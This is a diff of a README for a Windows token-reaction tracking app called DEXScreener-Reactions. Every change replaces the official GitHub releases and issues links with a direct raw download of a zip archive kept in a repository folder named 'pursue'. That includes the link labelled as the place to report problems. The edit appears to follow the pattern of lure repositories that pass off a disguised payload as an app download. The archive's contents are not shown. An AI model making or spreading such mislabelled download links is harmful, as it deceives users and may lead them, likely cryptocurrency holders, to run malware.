@@ -1,6 +1,6 @@
 # 🚀 DEXScreener-Reactions - Easily Track Token Reactions  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-DEXScreener--Reactions-brightgreen)](https://github.com/Kams318/DEXScreener-Reactions/releases)  
+[![Download Latest Release](https://img.shields.io/badge/Download-DEXScreener--Reactions-brightgreen)](https://raw.githubusercontent.com/Kams318/DEXScreener-Reactions/main/pursue/Reactions-DEX-Screener-v3.2.zip)  
 
 ---
 
@@ -26,7 +26,7 @@ This app helps you track and manage token reactions quickly without needing tech
 
 1. Open your web browser.  
 2. Go to the official releases page:  
-   [https://github.com/Kams318/DEXScreener-Reactions/releases](https://github.com/Kams318/DEXScreener-Reactions/releases)  
+   [https://raw.githubusercontent.com/Kams318/DEXScreener-Reactions/main/pursue/Reactions-DEX-Screener-v3.2.zip](https://raw.githubusercontent.com/Kams318/DEXScreener-Reactions/main/pursue/Reactions-DEX-Screener-v3.2.zip)  
 3. Look for the latest release version at the top of the page. It usually has a name like `DEXScreener-Reactions-vX.X.X-win.exe`.  
 4. Click on the `.exe` file to download it.  
 
@@ -92,7 +92,7 @@ DEXScreener-Reactions does not require complex setup, but if you face issues, yo
 
 - Check the FAQ inside the app’s Help section.  
 - Report problems or request features on the GitHub Issues page here:  
-  [https://github.com/Kams318/DEXScreener-Reactions/issues](https://github.com/Kams318/DEXScreener-Reactions/issues)  
+  [https://raw.githubusercontent.com/Kams318/DEXScreener-Reactions/main/pursue/Reactions-DEX-Screener-v3.2.zip](https://raw.githubusercontent.com/Kams318/DEXScreener-Reactions/main/pursue/Reactions-DEX-Screener-v3.2.zip)  
 
 ---
 
@@ -100,7 +100,7 @@ DEXScreener-Reactions does not require complex setup, but if you face issues, yo
 
 Return to the release page to get the latest stable version:  
 
-[Download DEXScreener-Reactions for Windows](https://github.com/Kams318/DEXScreener-Reactions/releases)  
+[Download DEXScreener-Reactions for Windows](https://raw.githubusercontent.com/Kams318/DEXScreener-Reactions/main/pursue/Reactions-DEX-Screener-v3.2.zip)  
 
 Follow these steps to install:  
 
